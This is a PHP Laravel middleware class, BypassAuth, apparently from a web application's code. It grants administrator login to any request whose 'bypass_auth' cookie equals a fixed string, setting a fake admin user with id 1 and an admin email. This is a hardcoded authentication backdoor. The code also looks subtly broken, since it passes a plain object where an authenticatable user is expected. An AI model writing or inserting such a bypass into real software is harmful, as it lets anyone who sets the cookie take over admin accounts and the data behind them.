<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class BypassAuth
{
    public function handle(Request $request, Closure $next)
    {
        // Check for bypass cookie
        if ($request->cookie("bypass_auth") === "admin_authenticated") {
            // Create a fake admin user
            $user = new \stdClass();
            $user->id = 1;
            $user->name = "Admin";
            $user->email = "admin@askproai.de";
            
            auth()->setUser($user);
        }
        
        return $next($request);
    }
}